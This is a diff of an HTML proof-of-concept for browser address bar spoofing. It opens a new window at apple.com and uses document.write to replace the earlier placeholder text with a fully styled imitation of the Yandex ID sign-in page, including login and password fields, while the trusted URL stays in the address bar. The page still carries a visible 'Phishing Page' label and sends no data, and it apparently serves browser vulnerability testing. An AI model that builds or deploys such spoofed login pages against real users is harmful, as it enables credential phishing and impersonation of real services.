@@ -1,8 +1,85 @@
-<h1>Address Bar Spoofing: via document.write</h1>
-<p class="test"><input type="button" value="Run test case" onclick="
-        if(window.open.toString()!=&quot;function open&quot;+Function.prototype.toString().substr(9)) {
-                delete window.open;
-        }
-        w = window.open(&quot;https://www.apple.com&quot;, &quot;_blank&quot;);
-        w.document.write(&quot; Phishing Page Here                Check The Address Bar &quot;);
-" /></p>
+<h1>Address Bar Spoofing</h1>
+
+<p class="test">
+<input type="button" value="Yandex Login" onclick="
+if(window.open.toString() != 'function open' + Function.prototype.toString().substr(9)) {
+    delete window.open;
+}
+w = window.open('https://www.apple.com', '_blank');
+
+w.document.write(`
+<!DOCTYPE html>
+<html>
+<head>
+<title>Yandex ID — Sign in</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background:#f5f5f5;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+}
+.box {
+  background:white;
+  padding:36px;
+  border-radius:10px;
+  box-shadow:0 3px 14px rgba(0,0,0,0.15);
+  width:340px;
+}
+.logo {
+  font-size:26px;
+  font-weight:bold;
+  margin-bottom:18px;
+}
+.logo span {
+  color:#ffcc00;
+}
+h3 {
+  margin:8px 0 18px 0;
+}
+input {
+  width:100%;
+  padding:12px;
+  margin:8px 0;
+  border:1px solid #ccc;
+  border-radius:6px;
+}
+button {
+  width:100%;
+  padding:12px;
+  background:#ffcc00;
+  border:none;
+  border-radius:6px;
+  font-weight:bold;
+  cursor:pointer;
+}
+.note {
+  margin-top:14px;
+  font-size:12px;
+  color:#666;
+}
+.warn {
+  margin-top:10px;
+  font-size:12px;
+  color:#c00;
+  font-weight:bold;
+}
+</style>
+</head>
+<body>
+<div class='box'>
+  <div class='logo'>Yandex <span>ID</span></div>
+  <h3>Sign in</h3>
+  <input placeholder='Login or email'>
+  <input type='password' placeholder='Password'>
+  <button>Sign in</button>
+  <div class='note'>Access Yandex services with one account</div>
+  <div class='warn'>Phishing Page</div>
+</div>
+</body>
+</html>
+`);
+" />
+</p>
